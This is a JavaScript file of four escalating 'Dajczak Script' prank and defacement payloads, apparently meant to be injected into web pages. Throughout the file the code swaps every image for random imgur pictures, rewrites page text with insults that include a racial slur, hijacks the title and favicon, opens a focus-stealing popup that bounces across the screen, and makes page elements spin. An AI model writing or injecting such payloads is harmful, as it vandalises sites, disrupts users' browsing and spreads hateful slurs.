function ds1() {
    const dajczaki = ["https://i.imgur.com/DMDe9Vf.png", "https://i.imgur.com/gnHEA0x.png", "https://i.imgur.com/E8GHmUN.jpg", "https://i.imgur.com/Q7gLjlO.png", "https://i.imgur.com/0C2rgZl.jpeg", "https://i.imgur.com/5hKLB4a.jpeg",
                      "https://i.imgur.com/Z548ygf.jpeg", "https://i.imgur.com/lD45aam.jpeg", "https://i.imgur.com/VjoMWqt.jpeg", "https://i.imgur.com/Jt61cx9.jpeg", "https://i.imgur.com/xhueFzC.jpeg", "https://i.imgur.com/e5rsDlS.jpeg",
                      "https://i.imgur.com/f0ZSFmR.jpeg", "https://i.imgur.com/nUWmSVE.jpeg"];

    function dupsko() {
        var links = Array.prototype.slice.call(document.querySelectorAll("img"));
        var links2 = Array.prototype.slice.call(document.querySelectorAll("source"));
        for (var i = 0; i < links.length; i++) {
            links[i].src = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            links[i].srcset = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        }
        for (var i = 0; i < links2.length; i++) {
            links2[i].src = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            links2[i].srcset = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        }
    }

    window.setInterval(dupsko, 1);
}

function ds2() {
    const dajczaki = ["https://i.imgur.com/DMDe9Vf.png", "https://i.imgur.com/gnHEA0x.png", "https://i.imgur.com/E8GHmUN.jpg", "https://i.imgur.com/Q7gLjlO.png", "https://i.imgur.com/0C2rgZl.jpeg", "https://i.imgur.com/5hKLB4a.jpeg",
                      "https://i.imgur.com/Z548ygf.jpeg", "https://i.imgur.com/lD45aam.jpeg", "https://i.imgur.com/VjoMWqt.jpeg", "https://i.imgur.com/Jt61cx9.jpeg", "https://i.imgur.com/xhueFzC.jpeg", "https://i.imgur.com/e5rsDlS.jpeg",
                      "https://i.imgur.com/f0ZSFmR.jpeg", "https://i.imgur.com/nUWmSVE.jpeg"];
    const obrazanko = ["hacked kurwo", "nigger nigger", "XDXDXDXD", "Dajczak Script v2", "System32 not detected"]
    function dupsko() {
        var shouldHide = false;
        $('span').each(function() {
            if(shouldHide) {
                $(this).hide();
            } else {
                $(this).text(obrazanko[Math.floor(Math.random() * obrazanko.length)]);
            }
        });
        var links = Array.prototype.slice.call(document.querySelectorAll("img"));
        var links2 = Array.prototype.slice.call(document.querySelectorAll("source"));
        for (var i = 0; i < links.length; i++) {
            links[i].src = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            links[i].srcset = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        }
        for (var i = 0; i < links2.length; i++) {
            links2[i].src = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            links2[i].srcset = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        }
    }

    //czopek ulepszył to jakby co :)
    window.setInterval(dupsko, 1);
}

function ds3() {
    const dajczaki = ["https://i.imgur.com/DMDe9Vf.png", "https://i.imgur.com/gnHEA0x.png", "https://i.imgur.com/E8GHmUN.jpg", "https://i.imgur.com/Q7gLjlO.png", "https://i.imgur.com/0C2rgZl.jpeg", "https://i.imgur.com/5hKLB4a.jpeg",
                      "https://i.imgur.com/Z548ygf.jpeg", "https://i.imgur.com/lD45aam.jpeg", "https://i.imgur.com/VjoMWqt.jpeg", "https://i.imgur.com/Jt61cx9.jpeg", "https://i.imgur.com/xhueFzC.jpeg", "https://i.imgur.com/e5rsDlS.jpeg",
                      "https://i.imgur.com/f0ZSFmR.jpeg", "https://i.imgur.com/nUWmSVE.jpeg"];
    const obrazanko = ["hacked kurwo", "nigger nigger", "XDXDXDXD", "Dajczak Script v3", "System32 not detected"]
    function dupsko() {
        var shouldHide = false;
        $('span').each(function() {
            if(shouldHide) {
                $(this).hide();
            } else {
                $(this).text(obrazanko[Math.floor(Math.random() * obrazanko.length)]);
            }
        });
        var links = Array.prototype.slice.call(document.querySelectorAll("img"));
        var links2 = Array.prototype.slice.call(document.querySelectorAll("source"));
        document.body.style.backgroundImage = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        document.title = obrazanko[Math.floor(Math.random() * obrazanko.length)];
        var link = document.querySelector("link[rel~='icon']");
        if (!link) {
            link = document.createElement('link');
            link.rel = 'icon';
            document.getElementsByTagName('head')[0].appendChild(link);
        }
        for (var i = 0; i < links.length; i++) {
            links[i].src = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            links[i].srcset = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            link.href = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        }
        for (var i = 0; i < links2.length; i++) {
            links2[i].src = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            links2[i].srcset = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            link.href = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        }

    }

    function triggerFileDownload () {
      const fileName = "https://debilnia.github.io/assets/imgs/sillycat.jpg"
      const a = document.createElement('a')
      a.download = fileName
    }
    var xOff = 5;
    var yOff = 5;
    var xPos = 400;
    var yPos = -100;
    var flagRun = 1;
    function newXlt() {
    xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
    }

    function newXrt() {
    xOff = Math.ceil(7 * Math.random())  * 5 - 10;
    window.focus();
    }

    function newYup() {
    yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
    }

    function newYdn() {
    yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
    window.focus();
    }

    function fOff(){
    flagRun = 0;
    }

    function playBall() {
        xPos += xOff;
        yPos += yOff;

    if (xPos > screen.width - 357) newXlt();
    if (xPos < 0) newXrt();

    if (yPos > screen.height - 330) newYup();
    if (yPos < 0) newYdn();

    if (flagRun == 1) {
            window.moveTo(xPos, yPos);
            setTimeout('playBall()', 1);
        }
    }
    function openWindow(url) {
        aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
    }
    //czopek ulepszył to jakby co :)
    triggerFileDownload()
    playBall()
    window.setInterval(dupsko, 1);
    openWindow("https://debilnia.github.io/sillycat")
}

function ds4() {
    const dajczaki = ["https://i.imgur.com/DMDe9Vf.png", "https://i.imgur.com/gnHEA0x.png", "https://i.imgur.com/E8GHmUN.jpg", "https://i.imgur.com/Q7gLjlO.png", "https://i.imgur.com/0C2rgZl.jpeg", "https://i.imgur.com/5hKLB4a.jpeg",
                      "https://i.imgur.com/Z548ygf.jpeg", "https://i.imgur.com/lD45aam.jpeg", "https://i.imgur.com/VjoMWqt.jpeg", "https://i.imgur.com/Jt61cx9.jpeg", "https://i.imgur.com/xhueFzC.jpeg", "https://i.imgur.com/e5rsDlS.jpeg",
                      "https://i.imgur.com/f0ZSFmR.jpeg", "https://i.imgur.com/nUWmSVE.jpeg"];
    const obrazanko = ["hacked kurwo", "nigger nigger", "XDXDXDXD", "Dajczak Script v4 - Explosive Edition", "System32 not detected"]
    function dupsko() {
        var shouldHide = false;
        $('span').each(function() {
            if(shouldHide) {
                $(this).hide();
            } else {
                $(this).text(obrazanko[Math.floor(Math.random() * obrazanko.length)]);
            }
        });
        var links = Array.prototype.slice.call(document.querySelectorAll("img"));
        var links2 = Array.prototype.slice.call(document.querySelectorAll("source"));
        document.body.backgroundImage = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        document.title = obrazanko[Math.floor(Math.random() * obrazanko.length)];
        var link = document.querySelector("link[rel~='icon']");
        if (!link) {
            link = document.createElement('link');
            link.rel = 'icon';
            document.getElementsByTagName('head')[0].appendChild(link);
        }
        for (var i = 0; i < links.length; i++) {
            links[i].src = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            links[i].srcset = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            link.href = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        }
        for (var i = 0; i < links2.length; i++) {
            links2[i].src = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            links2[i].srcset = dajczaki[Math.floor(Math.random() * dajczaki.length)];
            link.href = dajczaki[Math.floor(Math.random() * dajczaki.length)];
        }

    }

    function triggerFileDownload () {
      const fileName = "https://debilnia.github.io/assets/imgs/sillycat.jpg"
      const a = document.createElement('a')
      a.download = fileName
    }
    var xOff = 5;
    var yOff = 5;
    var xPos = 400;
    var yPos = -100;
    var flagRun = 1;
    function newXlt() {
    xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
    }

    function newXrt() {
    xOff = Math.ceil(7 * Math.random())  * 5 - 10;
    window.focus();
    }

    function newYup() {
    yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
    }

    function newYdn() {
    yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
    window.focus();
    }

    function fOff(){
    flagRun = 0;
    }

    function playBall() {
        xPos += xOff;
        yPos += yOff;

    if (xPos > screen.width - 357) newXlt();
    if (xPos < 0) newXrt();

    if (yPos > screen.height - 330) newYup();
    if (yPos < 0) newYdn();

    if (flagRun == 1) {
            window.moveTo(xPos, yPos);
            setTimeout('playBall()', 1);
        }
    }
    function openWindow(url) {
        aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
    }
    //czopek ulepszył to jakby co :)
    g = document.createElement('div');
    g.setAttribute("id", "beka");
    triggerFileDownload()
    playBall()
    window.setInterval(dupsko, 1);
    openWindow("https://debilnia.github.io/sillycat")
    if(localStorage.xD!="xD") {+function(wojtyla,fuuuu,tim){fuuuu=(function(sin,cos){return{x:function(t,p,p2){return p*cos(t*p2);},y:function(t,p,p2){return p*sin(t*p2);}};})(Math.sin,Math.cos);tim=0;setInterval(function(is,ii){is=document.querySelectorAll("div");for(i=0;i<is.length;i++){ii=is[i];ii.p||(ii.p=Math.random()*500,ii.p2=Math.random()*100);with(ii[wojtyla]){position='relative';left=""+fuuuu.x(tim,ii.p,ii.p2)+"px";top=""+fuuuu.y(tim,ii.p,ii.p2)+"px";}}tim += 0.01;},10);}("style");var xD=document.querySelector("beka");xD.style="font-size:700px;top:0;position:fixed;transform:rotate(90deg)";xD.innerHTML='XD';xD.backgroundImage=dajczaki[Math.floor(Math.random() * dajczaki.length)]}
}
